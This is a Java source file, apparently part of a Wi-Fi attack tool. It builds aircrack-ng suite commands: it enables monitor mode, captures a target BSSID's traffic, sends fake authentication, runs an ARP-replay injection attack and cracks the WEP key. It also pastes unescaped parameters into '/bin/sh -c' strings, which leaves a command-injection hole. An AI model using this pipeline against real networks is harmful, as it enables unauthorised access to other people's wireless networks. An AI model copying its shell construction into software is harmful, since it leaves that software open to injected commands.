package isk.util;

public class CommandUtil {

    private static final String networkInterfaceCommand = "ls /sys/class/net/ -l | grep /w | sed 's/.*\\/w/w/'";
    private static final String setToMonitorModeNetworkCardCommand = "airmon-ng start <INTERFACE_NAME>";
    private static final String stopMonitorMode = "airmon-ng stop <INTERFACE_NAME>";
    private static final String scanAndSaveToFileCommand = "airodump-ng <INTERFACE_NAME> -w <FILE_PATH> --output-format csv --beacons &";
    private static final String storeToFileByBSSID = "airodump-ng -c <CHANNEL> -w <FILE_NAME> --bssid <BSSID> <INTERFACE_NAME> &";
    private static final String runAssociaction = "aireplay-ng -1 0 -a <BSSID> <INTERFACE_NAME>";
    private static final String attack = "aireplay-ng -3 -b <BSSID> <INTERFACE_NAME> &";
    private static final String aircrack = "aircrack-ng -a 1 -b <BSSID> <CAB_FILE_NAME> -q -s";

    public static String[] getNetworkInterfaceCommand() {
        return createBashCommand(networkInterfaceCommand);
    }

    public static String[] getSetToMonitorModeNetworkCardCommand(String networkInterface, String channel) {
        String cmd = setToMonitorModeNetworkCardCommand;
        cmd = cmd.replace("<INTERFACE_NAME>", networkInterface);
        if (channel != null)
            cmd = cmd + " -c " + channel;
        return createBashCommand(cmd);
    }

    public static String[] getStopMonitorMode(String interfaceName) {
        String cmd = stopMonitorMode;
        cmd = cmd.replace("<INTERFACE_NAME>", interfaceName);
        return createBashCommand(cmd);
    }

    public static String[] getScanAndSaveToFileCommand(String interfaceName, String filePath) {
        String cmd = scanAndSaveToFileCommand;
        if (interfaceName.equals("wlp2s0"))
            interfaceName = "wlp2s0mon";
        cmd = cmd.replace("<INTERFACE_NAME>", interfaceName);
        cmd = cmd.replace("<FILE_PATH>", filePath);
        return createBashCommand(cmd);
    }

    public static String[] getStoreToFileByBSSID(String channel, String fileName, String bssid, String interfaceName) {
        String cmd = storeToFileByBSSID;
        cmd = cmd.replace("<CHANNEL>", channel);
        cmd = cmd.replace("<FILE_NAME>", fileName);
        cmd = cmd.replace("<BSSID>", bssid);
        cmd = cmd.replace("<INTERFACE_NAME>", interfaceName);
        return createBashCommand(cmd);
    }

    public static String[] getRunAssociaction(String bssid, String interfaceName) {
        String cmd = runAssociaction;
        cmd = cmd.replace("<BSSID>", bssid);
        cmd = cmd.replace("<INTERFACE_NAME>", interfaceName);
        return createBashCommand(cmd);
    }

    public static String[] getAttack(String bssid, String interfaceName) {
        String cmd = attack;
        cmd = cmd.replace("<BSSID>", bssid);
        cmd = cmd.replace("<INTERFACE_NAME>", interfaceName);
        return createBashCommand(cmd);
    }

    public static String[] getAircrack(String cabFileName, String bssid) {
        String cmd = aircrack;
        cmd = cmd.replace("<BSSID>", bssid);
        cmd = cmd.replace("<CAB_FILE_NAME>", cabFileName);
        return createBashCommand(cmd);    }

    private static String[] createBashCommand(String cmd) {
        System.out.println(cmd);
        return new String[]{
                "/bin/sh",
                "-c",
                cmd
        };
    }

}
